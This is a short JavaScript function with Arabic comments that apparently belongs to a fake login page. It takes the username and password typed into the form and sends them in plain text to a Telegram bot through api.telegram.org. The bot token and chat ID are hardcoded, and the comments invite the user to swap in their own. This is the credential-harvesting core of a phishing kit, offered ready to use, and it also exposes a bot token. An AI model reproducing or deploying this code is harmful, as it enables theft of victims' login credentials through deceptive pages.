function sendData() {
    // الحصول على القيم المدخلة من المستخدم
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // التحقق من صحة البيانات المدخلة
    if (!username || !password) {
        alert('يرجى إدخال اسم المستخدم وكلمة المرور.');
        return;
    }

    // إعداد بيانات الرسالة
    const token = '6987647754:AAFvVvQUHxHikrutySjxATi2Th9ZVna467c'; // ضع التوكن الخاص بك هنا
    const chatId = '6621457692'; // ضع معرف الشات هنا
    const message = `اسم المستخدم: ${username}\nكلمة المرور: ${password}`;

    // عنوان API الخاص بتليجرام
    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    // إرسال الطلب
    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert('تم إرسال البيانات بنجاح!');
            } else {
                alert('حدث خطأ أثناء إرسال البيانات.');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('حدث خطأ أثناء إرسال البيانات.');
        });
}
